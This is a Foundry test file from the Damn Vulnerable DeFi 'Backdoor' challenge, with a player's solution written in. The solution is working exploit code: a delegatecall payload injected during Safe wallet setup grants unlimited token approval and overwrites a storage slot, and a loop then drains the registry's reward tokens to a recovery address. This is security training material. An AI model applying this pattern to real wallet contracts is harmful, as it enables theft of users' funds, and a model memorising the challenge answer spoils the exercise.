// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {IProxyCreationCallback, SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    function hack(DamnValuableToken token, address recovery, address newOwner) public {
        token.approve(recovery, type(uint256).max);
        // Set storage value at `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff74873927` to newOnwer
        assembly {
            sstore(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff74873927, newOwner)
            // sstore(0xada5013122d395ba3c54772283fb069b10426056ef8ca54750cb9bb552a59e7d, newOwner)
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // Arguments for the Safe::setup function
     // * @notice Sets an initial storage of the Safe contract.
     // * @param _owners List of Safe owners.
     // * @param _threshold Number of required confirmations for a Safe transaction.
     // * @param to Contract address for optional delegate call.
     // * @param data Data payload for optional delegate call.
     // * @param fallbackHandler Handler for fallback calls to this contract
     // * @param paymentToken Token that should be used for the payment (0 is ETH)
     // * @param payment Value that should be paid
     // * @param paymentReceiver Address that should receive the payment (or 0 if tx.origin)

        address[] memory owners = new address[](1);
        owners[0] = users[0]; // Player is the only owner

        bytes memory delegateCallData = abi.encodeWithSignature(
            "hack(address,address,address)",
            address(token),
            recovery,
            users[0]
        );

        for (uint256 i = 0; i < users.length; i++) {
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                                     address(singletonCopy),
                                     abi.encodeWithSelector(
                                       Safe.setup.selector,
                                       owners,
                                       1, //threshold number of confirmations
                                       address(this), // optional delegate call to address
                                       delegateCallData, // optional delegate call data
                                       address(0), // fallback handler
                                       token, // payment token
                                       0, // payment value
                                       address(0) // payment receiver
                                     ),
                                     0, // salt nonce
                                     walletRegistry // callback to the registry
            );
            if (token.balanceOf(address(proxy)) > 0) {
                token.transferFrom(address(proxy),  recovery, token.balanceOf(address(proxy)));
            }
        }

        // assertTrue(token.balanceOf(address(proxy)) == 10 ether,"Proxy should have received tokens");
        assertTrue(token.balanceOf(recovery) > 0,"Recovery address should have received tokens");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx"); // todo figure out send in one transaction

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
